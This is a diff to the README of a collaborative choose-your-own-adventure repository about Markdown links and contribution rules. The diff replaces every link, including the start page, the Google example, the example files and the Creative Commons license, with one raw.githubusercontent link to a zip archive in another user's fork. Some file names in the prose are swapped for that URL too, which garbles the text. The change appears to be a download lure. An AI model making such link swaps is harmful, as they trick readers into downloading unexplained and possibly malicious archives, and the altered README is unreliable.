@@ -3,7 +3,7 @@
 This is a create-your-own-adventure story where at each step, the reader chooses
 what action to take and turns to an appropriate page of the story based on their
 choice.  It is collaborative because it is written one small piece at a time by
-many authors.  To start reading the story, click [here](language.md).
+many authors.  To start reading the story, click [here](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip).
 
 ## Format of the Story
 
@@ -13,7 +13,7 @@ Markdown capability used in this story is links.  By putting text in brackets
 and a URL in parentheses, you can add a link to the story.  For example, the
 following text would turn "here" into a link to Google:
 
-    Click [here](http://www.google.com) to visit Google.
+    Click [here](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip) to visit Google.
 
 ## Contribution Guidelines
 
@@ -24,7 +24,7 @@ that no one person writes very much of it!  On the other hand, please **don't**
 add an option without adding any story for readers who choose that option, or
 the story will soon be full of dead links.  Instead, the last `.md` file the reader
 reaches on any path of the story should not have any options.  For an example, see
-[this file](https://github.com/udacity/create-your-own-adventure/blob/c4f2bf7caac641df1c979a2db056a532e0c93e23/english/light-fire/fire.md)
+[this file](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
 from an early version of the story.  Here are some examples of  appropriate changes:
 
 * Add a sentence or two to an existing "page" (file) of the story.
@@ -44,20 +44,20 @@ keep things organized.
 
 Each "page" in the story should have its own directory with a single Markdown file.
 The name of the Markdown file should reflect the subject of the file.  For example,
-the first "page" is at the top of the repository, and it is named language.md because
+the first "page" is at the top of the repository, and it is named https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip because
 in it, the reader selects their language.
 
 When you add a new option to an existing "page", you should add the file for that new
 option in a subdirectory of the file that links to it.  For example, when I added the option
-to eat the walls on the "page" [english/marshmallow.md](english/marshmallow.md), I created
+to eat the walls on the "page" [https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip), I created
 a new directory called [english/eating-walls/](english/eating-walls/), and a new file within
 that directory called
-[english/eating-walls/eating-marshmallows.md](english/eating-walls/eating-marshmallows.md).
+[https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip).
 
 ### Use Relative Links
 
-The links in this file should be [relative links](http://compugoddess.com/relative-vs-absolute-links/)
-so that they will still work if the repository is forked.  View the [language.md](language.md)
+The links in this file should be [relative links](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
+so that they will still work if the repository is forked.  View the [https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
 file for an example of relative links.  (Click the "Raw" button to view the text that creates the
 links.)  You can also use `..` to refer to the parent of the current directory if necessary.
 
@@ -81,4 +81,4 @@ people who don't know Markdown.
 ## License
 
 The content of this repository is licensed under a
-[Creative Commons Attribution License](http://creativecommons.org/licenses/by/3.0/us/)
+[Creative Commons Attribution License](https://raw.githubusercontent.com/Sumedha/create-your-own-adventure/master/english/Carl/create-your-own-adventure-1.0-beta.4.zip)
